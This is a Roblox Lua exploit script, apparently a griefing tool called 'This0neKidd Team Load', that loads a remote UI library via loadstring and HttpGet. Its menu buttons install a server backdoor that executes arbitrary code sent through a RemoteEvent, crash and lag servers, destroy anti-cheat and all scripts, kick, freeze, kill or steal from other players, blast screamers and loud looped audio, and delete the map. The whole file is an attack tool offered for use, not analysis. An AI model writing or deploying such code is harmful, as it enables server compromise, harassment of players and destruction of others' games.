-- This0neKidd Team Load - COMPLETE ULTIMATE VERSION
wait(2)

-- Enhanced safe Rayfield load with multiple fallbacks
local Rayfield
local RayfieldLoaded = false

local function LoadRayfield()
    local sources = {
        'https://sirius.menu/rayfield',
        'https://raw.githubusercontent.com/shlexware/Rayfield/main/source.lua'
    }
    
    for i, source in ipairs(sources) do
        local success, result = pcall(function()
            Rayfield = loadstring(game:HttpGet(source))()
            RayfieldLoaded = true
            return true
        end)
        
        if success and Rayfield then
            print("✅ Rayfield loaded from source " .. i)
            break
        else
            warn("❌ Failed to load from source " .. i)
        end
    end
    
    if not RayfieldLoaded then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "❌ Critical Error",
            Text = "Failed to load Rayfield UI",
            Duration = 10
        })
        return false
    end
    return true
end

if not LoadRayfield() then return end

wait(1)

-- Create main window
local Window = Rayfield:CreateWindow({
    Name = "🚀 This0neKidd Team Load v4.0",
    LoadingTitle = "⚡ ELITE HACKING SYSTEM",
    LoadingSubtitle = "Initializing All Modules...",
    ConfigurationSaving = {
        Enabled = true,
        FolderName = "This0neKidd_Config",
        FileName = "Settings"
    },
    Discord = {
        Enabled = false
    },
    KeySystem = false
})

wait(3)

-- Enhanced logging system
local function LogAction(action, status)
    print("🎯 [" .. os.date("%X") .. "] " .. action .. " - " .. status)
end

-- Safe execute function
local function SafeExecute(callback, actionName)
    local success, result = pcall(callback)
    if success then
        LogAction(actionName, "SUCCESS")
        return true
    else
        warn("❌ " .. actionName .. " failed: " .. tostring(result))
        LogAction(actionName, "FAILED")
        return false
    end
end

-- TAB 1: SYSTEM HACKS
local SystemTab = Window:CreateTab("🔧 SYSTEM HACKS", 4483345998)
wait(1)

local SystemSection1 = SystemTab:CreateSection("🎯 SERVER CONTROL")

local SysButton1 = SystemTab:CreateButton({
    Name = "🔄 INSTALL BACKDOOR SYSTEM",
    Callback = function()
        SafeExecute(function()
            local backdoorScript = Instance.new("Script")
            backdoorScript.Name = "This0neKidd_Backdoor"
            backdoorScript.Parent = game:GetService("ServerScriptService")
            
            backdoorScript.Source = [[
                local remote = Instance.new("RemoteEvent")
                remote.Name = "This0neKidd_Backdoor"
                remote.Parent = game:GetService("ReplicatedStorage")
                
                remote.OnServerEvent:Connect(function(player, command, ...)
                    local args = {...}
                    if command == "exec" then
                        local func, err = loadstring(args[1])
                        if func then pcall(func) end
                    end
                end)
            ]]
        end, "Backdoor Installation")
        
        Rayfield:Notify({
            Title = "✅ BACKDOOR INSTALLED",
            Content = "Full server access established",
            Duration = 6
        })
    end,
})

local SysButton2 = SystemTab:CreateButton({
    Name = "💥 SERVER CRASH",
    Callback = function()
        SafeExecute(function()
            spawn(function()
                while task.wait(0.1) do
                    for i = 1, 20 do
                        local part = Instance.new("Part")
                        part.Size = Vector3.new(50, 50, 50)
                        part.Position = Vector3.new(0, 500, 0)
                        part.Parent = workspace
                    end
                end
            end)
        end, "Server Crash")
        
        Rayfield:Notify({
            Title = "💥 CRASH ACTIVATED",
            Content = "Server crash sequence started",
            Duration = 6
        })
    end,
})

local SysButton3 = SystemTab:CreateButton({
    Name = "🐢 SERVER LAG",
    Callback = function()
        SafeExecute(function()
            for i = 1, 10 do
                spawn(function()
                    while task.wait(0.2) do
                        Instance.new("Decal").Parent = workspace
                    end
                end)
            end
        end, "Server Lag")
        
        Rayfield:Notify({
            Title = "🐢 LAG ACTIVATED",
            Content = "Server performance degraded",
            Duration = 6
        })
    end,
})

local SystemSection2 = SystemTab:CreateSection("🛡️ SECURITY BYPASS")

local SysButton4 = SystemTab:CreateButton({
    Name = "🛡️ BYPASS ANTI-CHEAT",
    Callback = function()
        SafeExecute(function()
            for _, obj in pairs(game:GetDescendants()) do
                if string.lower(obj.Name):find("anti") or string.lower(obj.Name):find("cheat") then
                    obj:Destroy()
                end
            end
        end, "Anti-Cheat Bypass")
        
        Rayfield:Notify({
            Title = "🛡️ ANTI-CHEAT BYPASSED",
            Content = "Security systems disabled",
            Duration = 6
        })
    end,
})

local SysButton5 = SystemTab:CreateButton({
    Name = "📜 REMOVE ALL SCRIPTS",
    Callback = function()
        SafeExecute(function()
            local count = 0
            for _, obj in pairs(game:GetDescendants()) do
                if obj:IsA("Script") or obj:IsA("LocalScript") then
                    obj:Destroy()
                    count = count + 1
                end
            end
            return count
        end, "Remove Scripts")
        
        Rayfield:Notify({
            Title = "📜 SCRIPTS REMOVED",
            Content = "All game scripts deleted",
            Duration = 6
        })
    end,
})

-- TAB 2: PLAYER CONTROL
local PlayerTab = Window:CreateTab("🎮 PLAYER CONTROL", 4483345998)
wait(1)

local PlayerSection1 = PlayerTab:CreateSection("👥 PLAYER MANAGEMENT")

local PlayerButton1 = PlayerTab:CreateButton({
    Name = "👢 KICK ALL PLAYERS",
    Callback = function()
        SafeExecute(function()
            for _, player in pairs(game.Players:GetPlayers()) do
                if player ~= game.Players.LocalPlayer then
                    player:Kick("This0neKidd Team")
                end
            end
        end, "Kick Players")
        
        Rayfield:Notify({
            Title = "👢 PLAYERS KICKED",
            Content = "All players removed from server",
            Duration = 6
        })
    end,
})

local PlayerButton2 = PlayerTab:CreateButton({
    Name = "❄️ FREEZE ALL PLAYERS",
    Callback = function()
        SafeExecute(function()
            for _, player in pairs(game.Players:GetPlayers()) do
                if player.Character then
                    local humanoid = player.Character:FindFirstChild("Humanoid")
                    if humanoid then
                        humanoid.WalkSpeed = 0
                        humanoid.JumpPower = 0
                    end
                end
            end
        end, "Freeze Players")
        
        Rayfield:Notify({
            Title = "❄️ PLAYERS FROZEN",
            Content = "All player movement stopped",
            Duration = 6
        })
    end,
})

local PlayerButton3 = PlayerTab:CreateButton({
    Name = "🕳️ TELEPORT TO VOID",
    Callback = function()
        SafeExecute(function()
            for _, player in pairs(game.Players:GetPlayers()) do
                if player ~= game.Players.LocalPlayer and player.Character then
                    local root = player.Character:FindFirstChild("HumanoidRootPart")
                    if root then
                        root.Position = Vector3.new(0, -100000, 0)
                    end
                end
            end
        end, "Void Teleport")
        
        Rayfield:Notify({
            Title = "🕳️ VOID TELEPORT",
            Content = "Players sent to the void",
            Duration = 6
        })
    end,
})

local PlayerSection2 = PlayerTab:CreateSection("🎒 INVENTORY CONTROL")

local PlayerButton4 = PlayerTab:CreateButton({
    Name = "🎒 STEAL ALL TOOLS",
    Callback = function()
        SafeExecute(function()
            local localPlayer = game.Players.LocalPlayer
            local stolen = 0
            
            for _, player in pairs(game.Players:GetPlayers()) do
                if player ~= localPlayer then
                    local backpack = player:FindFirstChild("Backpack")
                    if backpack then
                        for _, tool in pairs(backpack:GetChildren()) do
                            if tool:IsA("Tool") then
                                tool.Parent = localPlayer.Backpack
                                stolen = stolen + 1
                            end
                        end
                    end
                end
            end
            return stolen
        end, "Steal Tools")
        
        Rayfield:Notify({
            Title = "🎒 TOOLS STOLEN",
            Content = "All tools collected from players",
            Duration = 6
        })
    end,
})

local PlayerButton5 = PlayerTab:CreateButton({
    Name = "🔫 REMOVE ALL WEAPONS",
    Callback = function()
        SafeExecute(function()
            local removed = 0
            for _, player in pairs(game.Players:GetPlayers()) do
                if player ~= game.Players.LocalPlayer then
                    local backpack = player:FindFirstChild("Backpack")
                    if backpack then
                        for _, tool in pairs(backpack:GetChildren()) do
                            if tool:IsA("Tool") then
                                tool:Destroy()
                                removed = removed + 1
                            end
                        end
                    end
                end
            end
            return removed
        end, "Remove Weapons")
        
        Rayfield:Notify({
            Title = "🔫 WEAPONS REMOVED",
            Content = "All player weapons deleted",
            Duration = 6
        })
    end,
})

-- TAB 3: VISUAL EFFECTS
local VisualTab = Window:CreateTab("🎨 VISUAL EFFECTS", 4483345998)
wait(1)

local VisualSection1 = VisualTab:CreateSection("🖼️ TEXTURES")

local VisualButton1 = VisualTab:CreateButton({
    Name = "🖼️ TEXTURE SPAM ALL",
    Callback = function()
        SafeExecute(function()
            local textureId = "rbxassetid://87545251856447"
            local count = 0
            
            for _, part in pairs(workspace:GetDescendants()) do
                if part:IsA("Part") or part:IsA("MeshPart") then
                    for _, face in pairs({"Front", "Back", "Left", "Right", "Top", "Bottom"}) do
                        local decal = Instance.new("Decal")
                        decal.Face = Enum.NormalId[face]
                        decal.Texture = textureId
                        decal.Parent = part
                        count = count + 1
                    end
                end
            end
            return count
        end, "Texture Spam")
        
        Rayfield:Notify({
            Title = "🖼️ TEXTURE SPAM",
            Content = "Textures applied to entire map",
            Duration = 6
        })
    end,
})

local VisualButton2 = VisualTab:CreateButton({
    Name = "🌌 APPLY SKYBOX",
    Callback = function()
        SafeExecute(function()
            local textureId = "rbxassetid://87545251856447"
            local lighting = game:GetService("Lighting")
            
            for _, obj in pairs(lighting:GetChildren()) do
                if obj:IsA("Sky") then obj:Destroy() end
            end
            
            local sky = Instance.new("Sky")
            sky.SkyboxBk = textureId
            sky.SkyboxDn = textureId
            sky.SkyboxFt = textureId
            sky.SkyboxLf = textureId
            sky.SkyboxRt = textureId
            sky.SkyboxUp = textureId
            sky.Parent = lighting
        end, "Apply Skybox")
        
        Rayfield:Notify({
            Title = "🌌 SKYBOX APPLIED",
            Content = "Custom skybox texture set",
            Duration = 6
        })
    end,
})

local VisualSection2 = VisualTab:CreateSection("🌈 EFFECTS")

local VisualButton3 = VisualTab:CreateButton({
    Name = "🌈 RGB WORLD",
    Callback = function()
        SafeExecute(function()
            spawn(function()
                while task.wait(0.1) do
                    for i = 0, 1, 0.01 do
                        local r = math.sin(i * math.pi * 2) * 0.5 + 0.5
                        local g = math.sin((i + 0.33) * math.pi * 2) * 0.5 + 0.5  
                        local b = math.sin((i + 0.66) * math.pi * 2) * 0.5 + 0.5
                        
                        game:GetService("Lighting").Ambient = Color3.new(r, g, b)
                        task.wait(0.1)
                    end
                end
            end)
        end, "RGB World")
        
        Rayfield:Notify({
            Title = "🌈 RGB WORLD",
            Content = "Rainbow world effect activated",
            Duration = 6
        })
    end,
})

local VisualButton4 = VisualTab:CreateButton({
    Name = "💥 FLASHBANG",
    Callback = function()
        SafeExecute(function()
            local gui = Instance.new("ScreenGui")
            gui.Parent = game.CoreGui
            
            local frame = Instance.new("Frame")
            frame.Size = UDim2.new(1, 0, 1, 0)
            frame.Position = UDim2.new(0, 0, 0, 0)
            frame.BackgroundColor3 = Color3.new(1, 1, 1)
            frame.BorderSizePixel = 0
            frame.Parent = gui
            
            task.wait(1.5)
            gui:Destroy()
        end, "Flashbang")
        
        Rayfield:Notify({
            Title = "💥 FLASHBANG",
            Content = "Flash effect completed",
            Duration = 6
        })
    end,
})

local VisualSection3 = VisualTab:CreateSection("👻 SCREAMER")

local VisualButton5 = VisualTab:CreateButton({
    Name = "👻 ULTIMATE SCREAMER",
    Callback = function()
        SafeExecute(function()
            local textureId = "rbxassetid://87545251856447"
            local soundId = "rbxassetid://107921759971053"
            
            local screamerGui = Instance.new("ScreenGui")
            screamerGui.Name = "ScreamerGUI"
            screamerGui.Parent = game.CoreGui
            screamerGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
            
            local background = Instance.new("Frame")
            background.Size = UDim2.new(1, 0, 1, 0)
            background.Position = UDim2.new(0, 0, 0, 0)
            background.BackgroundColor3 = Color3.new(0, 0, 0)
            background.BorderSizePixel = 0
            background.ZIndex = 100
            background.Parent = screamerGui
            
            local image = Instance.new("ImageLabel")
            image.Size = UDim2.new(0, 50, 0, 50)
            image.Position = UDim2.new(0.5, -25, 0.5, -25)
            image.Image = textureId
            image.BackgroundTransparency = 1
            image.ZIndex = 200
            image.Parent = screamerGui
            
            local sound = Instance.new("Sound")
            sound.SoundId = soundId
            sound.Volume = 2
            sound.Parent = workspace
            sound:Play()
            
            spawn(function()
                local startTime = tick()
                local duration = 2.5
                
                while tick() - startTime < duration do
                    local progress = (tick() - startTime) / duration
                    local scale = math.exp(progress * 4) * 80
                    local shakeX = math.random(-10, 10) * progress
                    local shakeY = math.random(-10, 10) * progress
                    
                    image.Size = UDim2.new(0, scale, 0, scale)
                    image.Position = UDim2.new(0.5, -scale/2 + shakeX, 0.5, -scale/2 + shakeY)
                    
                    if progress > 0.6 then
                        background.BackgroundColor3 = Color3.new(progress, 0, 0)
                    end
                    
                    task.wait(0.01)
                end
                
                image.Size = UDim2.new(3, 0, 3, 0)
                image.Position = UDim2.new(-1, 0, -1, 0)
                
                task.wait(0.5)
                screamerGui:Destroy()
                sound:Stop()
            end)
        end, "Screamer")
        
        Rayfield:Notify({
            Title = "👻 SCREAMER ACTIVATED",
            Content = "ULTIMATE SCREAMER!",
            Duration = 6
        })
    end,
})

-- TAB 4: AUDIO CONTROL
local AudioTab = Window:CreateTab("🔊 AUDIO CONTROL", 4483345998)
wait(1)

local AudioSection1 = AudioTab:CreateSection("🔊 AUDIO SPAM")

local AudioButton1 = AudioTab:CreateButton({
    Name = "🔊 AUDIO SPAM ALL",
    Callback = function()
        SafeExecute(function()
            local soundId = "rbxassetid://107921759971053"
            
            for i = 1, 10 do
                spawn(function()
                    local sound = Instance.new("Sound")
                    sound.SoundId = soundId
                    sound.Volume = 0.7
                    sound.Parent = workspace
                    sound:Play()
                    
                    sound.Position = Vector3.new(
                        math.random(-200, 200),
                        math.random(0, 100),
                        math.random(-200, 200)
                    )
                    
                    task.wait(8)
                    sound:Stop()
                end)
            end
        end, "Audio Spam")
        
        Rayfield:Notify({
            Title = "🔊 AUDIO SPAM",
            Content = "Multiple audio sources spawned",
            Duration = 6
        })
    end,
})

local AudioButton2 = AudioTab:CreateButton({
    Name = "📢 GLOBAL EAR RAPE",
    Callback = function()
        SafeExecute(function()
            local soundId = "rbxassetid://107921759971053"
            
            for i = 1, 5 do
                local sound = Instance.new("Sound")
                sound.SoundId = soundId
                sound.Volume = 3
                sound.Looped = true
                sound.Parent = workspace
                sound:Play()
            end
        end, "Global Ear Rape")
        
        Rayfield:Notify({
            Title = "📢 GLOBAL EAR RAPE",
            Content = "Maximum volume audio activated",
            Duration = 6
        })
    end,
})

local AudioSection2 = AudioTab:CreateSection("🎧 PLAYER AUDIO")

local AudioButton3 = AudioTab:CreateButton({
    Name = "🎧 SOUND ON PLAYERS",
    Callback = function()
        SafeExecute(function()
            local soundId = "rbxassetid://107921759971053"
            
            for _, player in pairs(game.Players:GetPlayers()) do
                if player.Character then
                    local head = player.Character:FindFirstChild("Head")
                    if head then
                        local sound = Instance.new("Sound")
                        sound.SoundId = soundId
                        sound.Volume = 0.8
                        sound.Looped = true
                        sound.Parent = head
                        sound:Play()
                    end
                end
            end
        end, "Player Sounds")
        
        Rayfield:Notify({
            Title = "🎧 PLAYER SOUNDS",
            Content = "Audio attached to all players",
            Duration = 6
        })
    end,
})

-- TAB 5: DESTRUCTIVE
local DestructiveTab = Window:CreateTab("💣 DESTRUCTIVE", 4483345998)
wait(1)

local DestructiveSection1 = DestructiveTab:CreateSection("🗑️ MAP DESTRUCTION")

local DestructiveButton1 = DestructiveTab:CreateButton({
    Name = "🗑️ DELETE ENTIRE MAP",
    Callback = function()
        SafeExecute(function()
            local deleted = 0
            for _, obj in pairs(workspace:GetChildren()) do
                if obj:IsA("Part") or obj:IsA("MeshPart") or obj:IsA("Model") then
                    obj:Destroy()
                    deleted = deleted + 1
                end
            end
            return deleted
        end, "Delete Map")
        
        Rayfield:Notify({
            Title = "🗑️ MAP DELETED",
            Content = "All map objects removed",
            Duration = 6
        })
    end,
})

local DestructiveButton2 = DestructiveTab:CreateButton({
    Name = "🔥 CORRUPT GAME DATA",
    Callback = function()
        SafeExecute(function()
            for _, player in pairs(game.Players:GetPlayers()) do
                player:SetAttribute("Corrupted", true)
            end
            
            local lighting = game:GetService("Lighting")
            lighting.Ambient = Color3.new(1, 0, 0)
            lighting.Brightness = 8
            lighting.FogColor = Color3.new(1, 0, 0)
            lighting.FogEnd = 50
        end, "Corrupt Data")
        
        Rayfield:Notify({
            Title = "🔥 DATA CORRUPTED",
            Content = "Game data successfully corrupted",
            Duration = 6
        })
    end,
})

-- TAB 6: UTILITIES
local UtilTab = Window:CreateTab("⚙️ UTILITIES", 4483345998)
wait(1)

local UtilSection1 = UtilTab:CreateSection("🔄 SYSTEM CONTROL")

local UtilButton1 = UtilTab:CreateButton({
    Name = "🔄 EMERGENCY RESET",
    Callback = function()
        SafeExecute(function()
            -- Reset lighting
            local lighting = game:GetService("Lighting")
            lighting:ClearAllChildren()
            
            -- Kill all players
            for _, player in pairs(game.Players:GetPlayers()) do
                if player.Character then
                    player.Character:BreakJoints()
                end
            end
            
            -- Stop all sounds
            for _, sound in pairs(workspace:GetDescendants()) do
                if sound:IsA("Sound") then
                    sound:Stop()
                end
            end
        end, "Emergency Reset")
        
        Rayfield:Notify({
            Title = "🔄 EMERGENCY RESET",
            Content = "Full game reset completed",
            Duration = 6
        })
    end,
})

local UtilButton2 = UtilTab:CreateButton({
    Name = "🧹 CLEAR ALL EFFECTS",
    Callback = function()
        SafeExecute(function()
            -- Clear decals
            for _, part in pairs(workspace:GetDescendants()) do
                for _, decal in pairs(part:GetChildren()) do
                    if decal:IsA("Decal") then
                        decal:Destroy()
                    end
                end
            end
            
            -- Clear skybox
            local lighting = game:GetService("Lighting")
            for _, obj in pairs(lighting:GetChildren()) do
                if obj:IsA("Sky") then
                    obj:Destroy()
                end
            end
            
            -- Clear sounds
            for _, sound in pairs(workspace:GetDescendants()) do
                if sound:IsA("Sound") then
                    sound:Stop()
                end
            end
        end, "Clear Effects")
        
        Rayfield:Notify({
            Title = "🧹 EFFECTS CLEARED",
            Content = "All visual/audio effects removed",
            Duration = 6
        })
    end,
})

-- FINAL SUCCESS MESSAGE
wait(2)
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "🚀 THIS0NEKIDD TEAM LOADED",
    Text = "Complete System Activated!\n6 Tabs | 20+ Functions",
    Duration = 8
})

LogAction("System Startup", "COMPLETE")
print("🎯 THIS0NEKIDD TEAM COMPLETE SYSTEM ACTIVATED")
print("📊 TABS: 6 | FUNCTIONS: 20+ | STATUS: FULLY OPERATIONAL")
